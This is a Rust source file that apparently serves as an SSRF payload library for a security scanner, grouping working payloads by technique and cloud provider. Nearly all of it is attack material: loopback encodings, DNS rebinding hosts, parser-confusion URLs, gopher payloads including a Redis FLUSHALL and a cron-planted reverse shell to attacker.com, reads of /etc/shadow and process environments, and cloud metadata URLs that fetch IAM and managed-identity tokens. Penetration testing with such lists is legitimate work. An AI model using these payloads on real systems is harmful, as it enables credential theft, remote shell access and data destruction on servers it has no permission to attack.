/// Comprehensive SSRF payload library: IP format tricks (decimal, hex, octal, IPv6 mapped),
/// DNS rebinding, URL parser confusion (backslash, @, fragment), protocol smuggling (gopher,
/// dict, file), cloud metadata URLs per provider, and internal service discovery patterns.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SsrfCategory {
    IpFormatBypass,
    DnsRebinding,
    UrlParserConfusion,
    ProtocolSmuggling,
    CloudMetadata,
    InternalServiceDiscovery,
    RedirectBypass,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Alibaba,
    Oracle,
    Generic,
}

#[derive(Debug, Clone)]
pub struct SsrfPayload {
    pub payload: &'static str,
    pub category: SsrfCategory,
    pub cloud_provider: Option<CloudProvider>,
    pub description: &'static str,
}

impl SsrfCategory {
    pub fn all() -> &'static [SsrfCategory] {
        &[
            SsrfCategory::IpFormatBypass,
            SsrfCategory::DnsRebinding,
            SsrfCategory::UrlParserConfusion,
            SsrfCategory::ProtocolSmuggling,
            SsrfCategory::CloudMetadata,
            SsrfCategory::InternalServiceDiscovery,
            SsrfCategory::RedirectBypass,
        ]
    }
}

impl CloudProvider {
    pub fn all() -> &'static [CloudProvider] {
        &[
            CloudProvider::Aws,
            CloudProvider::Gcp,
            CloudProvider::Azure,
            CloudProvider::DigitalOcean,
            CloudProvider::Alibaba,
            CloudProvider::Oracle,
            CloudProvider::Generic,
        ]
    }
}

// ---------------------------------------------------------------------------
// IP format bypass payloads
// ---------------------------------------------------------------------------
const IP_FORMAT_PAYLOADS: &[SsrfPayload] = &[
    // Decimal representations of 127.0.0.1
    SsrfPayload {
        payload: "http://2130706433/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Decimal IP for 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://2130706433:80/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Decimal IP with port",
    },
    // Hex representations
    SsrfPayload {
        payload: "http://0x7f000001/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Hex IP for 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://0x7f.0x0.0x0.0x1/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Dotted hex IP",
    },
    SsrfPayload {
        payload: "http://0x7f000001:80/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Hex IP with port",
    },
    // Octal representations
    SsrfPayload {
        payload: "http://0177.0.0.01/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Octal IP for 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://0177.0000.0000.0001/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Padded octal IP",
    },
    SsrfPayload {
        payload: "http://0177.0.0.1:80/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Octal IP with port",
    },
    // IPv6 representations
    SsrfPayload {
        payload: "http://[::1]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 loopback",
    },
    SsrfPayload {
        payload: "http://[::1]:80/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 loopback with port",
    },
    SsrfPayload {
        payload: "http://[0:0:0:0:0:0:0:1]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 full form loopback",
    },
    SsrfPayload {
        payload: "http://[::ffff:127.0.0.1]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 mapped IPv4 loopback",
    },
    SsrfPayload {
        payload: "http://[::ffff:7f00:1]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 mapped hex loopback",
    },
    SsrfPayload {
        payload: "http://[0000::1]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "IPv6 padded loopback",
    },
    // Mixed format
    SsrfPayload {
        payload: "http://127.1/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Shortened loopback (127.1)",
    },
    SsrfPayload {
        payload: "http://127.0.1/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Three-octet loopback",
    },
    SsrfPayload {
        payload: "http://127.000.000.001/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Zero-padded decimal loopback",
    },
    SsrfPayload {
        payload: "http://0/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Zero resolves to 0.0.0.0",
    },
    SsrfPayload {
        payload: "http://0.0.0.0/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "All-zeros address",
    },
    SsrfPayload {
        payload: "http://localhost/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Localhost hostname",
    },
    SsrfPayload {
        payload: "http://localtest.me/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "localtest.me resolves to 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://spoofed.burpcollaborator.net/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: None,
        description: "Burp Collaborator DNS",
    },
    // 169.254.169.254 representations (cloud metadata)
    SsrfPayload {
        payload: "http://2852039166/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Decimal IP for 169.254.169.254",
    },
    SsrfPayload {
        payload: "http://0xa9fea9fe/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Hex IP for 169.254.169.254",
    },
    SsrfPayload {
        payload: "http://0251.0376.0251.0376/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Octal IP for 169.254.169.254",
    },
    SsrfPayload {
        payload: "http://[::ffff:169.254.169.254]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "IPv6 mapped 169.254.169.254",
    },
    SsrfPayload {
        payload: "http://[::ffff:a9fe:a9fe]/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "IPv6 hex mapped metadata IP",
    },
    SsrfPayload {
        payload: "http://169.254.169.254.nip.io/",
        category: SsrfCategory::IpFormatBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "nip.io wildcard DNS for metadata IP",
    },
];

// ---------------------------------------------------------------------------
// DNS rebinding payloads
// ---------------------------------------------------------------------------
const DNS_REBINDING_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload {
        payload: "http://1.0.0.127.nip.io/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "nip.io loopback DNS",
    },
    SsrfPayload {
        payload: "http://127.0.0.1.nip.io/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "nip.io direct loopback",
    },
    SsrfPayload {
        payload: "http://127.0.0.1.sslip.io/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "sslip.io loopback DNS",
    },
    SsrfPayload {
        payload: "http://169.254.169.254.sslip.io/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: Some(CloudProvider::Generic),
        description: "sslip.io metadata IP",
    },
    SsrfPayload {
        payload: "http://customer1.app.127.0.0.1.nip.io/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "Subdomain wildcard DNS loopback",
    },
    SsrfPayload {
        payload: "http://make-127-0-0-1-rr.1u.ms/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "1u.ms rebinding service",
    },
    SsrfPayload {
        payload: "http://lock.cmpxchg8b.com/rebinder.html",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "DNS rebinding tool reference",
    },
    SsrfPayload {
        payload: "http://A.8.8.8.8.1time.169.254.169.254.1time.repeat.rebind.network/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Rebind.network time-based rebinding",
    },
    SsrfPayload {
        payload: "http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Rebind.network loopback/metadata toggle",
    },
    SsrfPayload {
        payload: "http://rbndr.us/dnsrebind.html",
        category: SsrfCategory::DnsRebinding,
        cloud_provider: None,
        description: "rbndr.us rebinding service",
    },
];

// ---------------------------------------------------------------------------
// URL parser confusion payloads
// ---------------------------------------------------------------------------
const URL_PARSER_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload {
        payload: "http://evil.com@127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "@ symbol userinfo confusion",
    },
    SsrfPayload {
        payload: "http://127.0.0.1%2523@evil.com/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Double-encoded # fragment confusion",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:80%40evil.com/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Encoded @ after port",
    },
    SsrfPayload {
        payload: "http://evil.com#@127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Fragment before @ confusion",
    },
    SsrfPayload {
        payload: "http://127.0.0.1\\@evil.com/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Backslash before @ confusion",
    },
    SsrfPayload {
        payload: "http://evil.com\\@127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Backslash in userinfo",
    },
    SsrfPayload {
        payload: "http://127%2e0%2e0%2e1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "URL-encoded dots in IP",
    },
    SsrfPayload {
        payload: "http://127.0.0.1%00@evil.com/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Null byte in URL confusion",
    },
    SsrfPayload {
        payload: "http://evil.com:80@127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Port in userinfo confusion",
    },
    SsrfPayload {
        payload: "http://127.0.0.1%0d%0a@evil.com/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "CRLF in URL confusion",
    },
    SsrfPayload {
        payload: "http://127.0.0.1/%2f../",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Encoded slash path traversal",
    },
    SsrfPayload {
        payload: "http://127.0.0.1/%252f../",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Double-encoded slash traversal",
    },
    SsrfPayload {
        payload: "http://127.0.0.1/..;/admin",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Semicolon path parameter traversal",
    },
    SsrfPayload {
        payload: "http://evil.com:80\\@127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Backslash after port confusion",
    },
    SsrfPayload {
        payload: "http://ⓔⓥⓘⓛ.ⓒⓞⓜ/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Unicode enclosed chars confusion",
    },
    SsrfPayload {
        payload: "http://①②⑦.⓪.⓪.①/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Unicode numbers for 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:11211:80/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Double port confusion",
    },
    SsrfPayload {
        payload: "http://127。0。0。1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "CJK fullwidth dots",
    },
    SsrfPayload {
        payload: "http://evil.com%09127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Tab character in hostname",
    },
    SsrfPayload {
        payload: "httP://127.0.0.1/",
        category: SsrfCategory::UrlParserConfusion,
        cloud_provider: None,
        description: "Mixed case protocol",
    },
];

// ---------------------------------------------------------------------------
// Protocol smuggling payloads
// ---------------------------------------------------------------------------
const PROTOCOL_SMUGGLING_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload { payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Gopher to Redis FLUSHALL" },
    SsrfPayload { payload: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$64%0d%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Gopher Redis reverse shell cron" },
    SsrfPayload { payload: "gopher://127.0.0.1:11211/_set%20ssrf%200%2060%205%0d%0ahello%0d%0a", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Gopher to Memcached SET" },
    SsrfPayload { payload: "gopher://127.0.0.1:25/_EHLO%20attacker.com%0d%0aMAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<admin@target.com>%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0a%0d%0aPwned%0d%0a.%0d%0aQUIT", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Gopher to SMTP send email" },
    SsrfPayload { payload: "gopher://127.0.0.1:3306/_%01%00%00%01%85%a6%03%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Gopher to MySQL handshake" },
    SsrfPayload { payload: "dict://127.0.0.1:6379/info", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Dict protocol to Redis INFO" },
    SsrfPayload { payload: "dict://127.0.0.1:11211/stats", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Dict protocol to Memcached STATS" },
    SsrfPayload { payload: "file:///etc/passwd", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read /etc/passwd" },
    SsrfPayload { payload: "file:///etc/shadow", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read /etc/shadow" },
    SsrfPayload { payload: "file:///etc/hosts", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read /etc/hosts" },
    SsrfPayload { payload: "file:///proc/self/environ", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read process env" },
    SsrfPayload { payload: "file:///proc/self/cmdline", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read process cmdline" },
    SsrfPayload { payload: "file:///proc/net/tcp", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read open ports" },
    SsrfPayload { payload: "file:///proc/net/fib_trie", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol read routing table" },
    SsrfPayload { payload: "file://C:/Windows/win.ini", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol Windows win.ini" },
    SsrfPayload { payload: "file://C:/Windows/System32/drivers/etc/hosts", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "File protocol Windows hosts file" },
    SsrfPayload { payload: "ldap://127.0.0.1/dc=example,dc=com", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "LDAP protocol internal query" },
    SsrfPayload { payload: "tftp://127.0.0.1/test", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "TFTP protocol probe" },
    SsrfPayload { payload: "jar:http://127.0.0.1/!/file.txt", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "JAR protocol SSRF (Java)" },
    SsrfPayload { payload: "netdoc:///etc/passwd", category: SsrfCategory::ProtocolSmuggling, cloud_provider: None, description: "Netdoc protocol file read (Java)" },
];

// ---------------------------------------------------------------------------
// Cloud metadata payloads
// ---------------------------------------------------------------------------
const CLOUD_METADATA_PAYLOADS: &[SsrfPayload] = &[
    // AWS
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS IMDSv1 metadata root" },
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS IAM role credentials" },
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/hostname", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS instance hostname" },
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/local-ipv4", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS internal IP" },
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/public-keys/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS SSH public keys" },
    SsrfPayload { payload: "http://169.254.169.254/latest/user-data", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS user data (startup scripts)" },
    SsrfPayload { payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS instance identity document" },
    SsrfPayload { payload: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS EC2 identity credentials" },
    SsrfPayload { payload: "http://169.254.170.2/v2/credentials", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Aws), description: "AWS ECS task credentials" },
    // GCP
    SsrfPayload { payload: "http://metadata.google.internal/computeMetadata/v1/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Gcp), description: "GCP metadata root" },
    SsrfPayload { payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Gcp), description: "GCP project ID" },
    SsrfPayload { payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Gcp), description: "GCP service account token" },
    SsrfPayload { payload: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Gcp), description: "GCP Kubernetes environment" },
    SsrfPayload { payload: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Gcp), description: "GCP SSH keys" },
    // Azure
    SsrfPayload { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Azure), description: "Azure IMDS instance metadata" },
    SsrfPayload { payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Azure), description: "Azure managed identity token" },
    SsrfPayload { payload: "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Azure), description: "Azure compute metadata" },
    SsrfPayload { payload: "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Azure), description: "Azure network metadata" },
    // DigitalOcean
    SsrfPayload { payload: "http://169.254.169.254/metadata/v1/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::DigitalOcean), description: "DigitalOcean metadata root" },
    SsrfPayload { payload: "http://169.254.169.254/metadata/v1/id", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::DigitalOcean), description: "DigitalOcean droplet ID" },
    SsrfPayload { payload: "http://169.254.169.254/metadata/v1/user-data", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::DigitalOcean), description: "DigitalOcean user data" },
    // Alibaba
    SsrfPayload { payload: "http://100.100.100.200/latest/meta-data/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Alibaba), description: "Alibaba Cloud metadata root" },
    SsrfPayload { payload: "http://100.100.100.200/latest/meta-data/ram/security-credentials/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Alibaba), description: "Alibaba Cloud RAM credentials" },
    SsrfPayload { payload: "http://100.100.100.200/latest/meta-data/instance-id", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Alibaba), description: "Alibaba Cloud instance ID" },
    // Oracle Cloud
    SsrfPayload { payload: "http://169.254.169.254/opc/v2/instance/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Oracle), description: "Oracle Cloud instance metadata" },
    SsrfPayload { payload: "http://169.254.169.254/opc/v2/instance/metadata/", category: SsrfCategory::CloudMetadata, cloud_provider: Some(CloudProvider::Oracle), description: "Oracle Cloud custom metadata" },
];

// ---------------------------------------------------------------------------
// Internal service discovery payloads
// ---------------------------------------------------------------------------
const INTERNAL_SERVICE_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload {
        payload: "http://127.0.0.1:6379/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Redis default port probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:11211/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Memcached default port probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:9200/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Elasticsearch default port",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:9200/_cluster/health",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Elasticsearch cluster health",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:5601/api/status",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Kibana status API",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:27017/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "MongoDB default port probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:5432/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "PostgreSQL default port probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:3306/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "MySQL default port probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:8080/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Common HTTP alt port",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:8443/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Common HTTPS alt port",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:2379/version",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "etcd version probe",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:2379/v2/keys/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "etcd key listing",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:8500/v1/agent/self",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Consul agent info",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:10255/pods",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Kubelet pods endpoint",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:10255/healthz",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Kubelet health check",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:4040/api/tunnels",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "ngrok tunnels API",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:15672/api/overview",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "RabbitMQ management API",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:8888/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Jupyter Notebook default",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:9090/api/v1/status/config",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Prometheus config endpoint",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:3000/api/health",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Grafana health endpoint",
    },
    SsrfPayload {
        payload: "http://kubernetes.default.svc/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Kubernetes API internal DNS",
    },
    SsrfPayload {
        payload: "http://kubernetes.default.svc:443/api/v1/namespaces",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Kubernetes namespace listing",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:8200/v1/sys/health",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "HashiCorp Vault health",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:4194/api/v1.3/containers/",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "cAdvisor containers API",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:2375/info",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Docker API (unauthenticated)",
    },
    SsrfPayload {
        payload: "http://127.0.0.1:2375/containers/json",
        category: SsrfCategory::InternalServiceDiscovery,
        cloud_provider: None,
        description: "Docker container listing",
    },
];

// ---------------------------------------------------------------------------
// Redirect-based bypass payloads
// ---------------------------------------------------------------------------
const REDIRECT_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload { payload: "http://httpbin.org/redirect-to?url=http://127.0.0.1/", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "Open redirect to localhost via httpbin" },
    SsrfPayload { payload: "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/", category: SsrfCategory::RedirectBypass, cloud_provider: Some(CloudProvider::Aws), description: "Open redirect to AWS metadata" },
    SsrfPayload { payload: "https://ngrok.io/redirect?url=http://127.0.0.1/", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "Redirect service to localhost" },
    SsrfPayload { payload: "http://attacker.com/302.php?url=http://169.254.169.254/", category: SsrfCategory::RedirectBypass, cloud_provider: Some(CloudProvider::Generic), description: "Attacker-controlled 302 redirect" },
    SsrfPayload { payload: "http://shorturl.at/internal-redirect", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "URL shortener redirect to internal" },
    SsrfPayload { payload: "https://bit.ly/internal-ssrf", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "bit.ly redirect to internal" },
    SsrfPayload { payload: "http://0x7f000001.attacker.com/", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "Wildcard DNS resolving to 127.0.0.1" },
    SsrfPayload { payload: "http://attacker.com/redirect?to=gopher://127.0.0.1:6379/", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "Redirect to gopher protocol" },
    SsrfPayload { payload: "http://www.attacker.com/301?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/", category: SsrfCategory::RedirectBypass, cloud_provider: Some(CloudProvider::Aws), description: "301 redirect to AWS IAM creds" },
    SsrfPayload { payload: "http://attacker.com/redirect?url=file:///etc/passwd", category: SsrfCategory::RedirectBypass, cloud_provider: None, description: "Redirect to file protocol" },
];

/// Returns all SSRF payloads.
pub fn all_ssrf_payloads() -> Vec<&'static SsrfPayload> {
    let mut all = Vec::with_capacity(200);
    all.extend(IP_FORMAT_PAYLOADS.iter());
    all.extend(DNS_REBINDING_PAYLOADS.iter());
    all.extend(URL_PARSER_PAYLOADS.iter());
    all.extend(PROTOCOL_SMUGGLING_PAYLOADS.iter());
    all.extend(CLOUD_METADATA_PAYLOADS.iter());
    all.extend(INTERNAL_SERVICE_PAYLOADS.iter());
    all.extend(REDIRECT_PAYLOADS.iter());
    all
}

/// Filter payloads by SSRF category.
pub fn ssrf_payloads_by_category(category: SsrfCategory) -> Vec<&'static SsrfPayload> {
    all_ssrf_payloads()
        .into_iter()
        .filter(|p| p.category == category)
        .collect()
}

/// Filter payloads targeting a specific cloud provider.
pub fn ssrf_payloads_by_cloud(provider: CloudProvider) -> Vec<&'static SsrfPayload> {
    all_ssrf_payloads()
        .into_iter()
        .filter(|p| p.cloud_provider == Some(provider))
        .collect()
}

/// Return all cloud metadata SSRF payloads.
pub fn ssrf_cloud_metadata_payloads() -> Vec<&'static SsrfPayload> {
    ssrf_payloads_by_category(SsrfCategory::CloudMetadata)
}

/// Total count of all SSRF payloads.
pub fn ssrf_payload_count() -> usize {
    IP_FORMAT_PAYLOADS.len()
        + DNS_REBINDING_PAYLOADS.len()
        + URL_PARSER_PAYLOADS.len()
        + PROTOCOL_SMUGGLING_PAYLOADS.len()
        + CLOUD_METADATA_PAYLOADS.len()
        + INTERNAL_SERVICE_PAYLOADS.len()
        + REDIRECT_PAYLOADS.len()
}
